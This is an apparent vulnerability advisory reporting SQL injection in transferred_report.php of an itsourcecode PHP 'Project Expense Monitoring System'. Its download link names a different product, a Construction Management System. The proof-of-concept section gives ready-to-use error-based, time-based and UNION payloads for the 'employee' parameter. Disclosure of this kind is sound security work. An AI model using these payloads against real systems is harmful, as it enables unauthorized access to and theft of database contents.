# Vendor

itsourcecode

# Product

Project Expense Monitoring System

# version

V1.0

# Download 

https://itsourcecode.com/wp-content/uploads/2021/03/Construction-Management-System-Project-In-PHP-Source-Code.zip

# Vulnerability

SQLi

# Description

There are multiple SQLi injection vulnerabilities in the transferred_report.php page. Attackers can pass special SQL statements in the "$_POST['start']", "$_POST['end']", and "$_POST['employee']" parameters to obtain sensitive data in the database.
<img width="1140" alt="image" src="https://github.com/user-attachments/assets/27982a1c-695b-4e37-947d-8ee6ecc13856">

# POC
```
Parameter: employee (POST)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: employee=2' AND EXTRACTVALUE(8219,CONCAT(0x5c,0x7162627871,(SELECT (ELT(8219=8219,1))),0x717a627a71)) AND 'Priq'='Priq&search=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: employee=2' AND (SELECT 7024 FROM (SELECT(SLEEP(5)))kFSQ) AND 'IGyK'='IGyK&search=

    Type: UNION query
    Title: Generic UNION query (NULL) - 14 columns
    Payload: employee=2' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162627871,0x45716f47644d666d664649754b656c745a50746f714c474274445472556469537478474853514c69,0x717a627a71),NULL,NULL,NULL-- -&search=
```
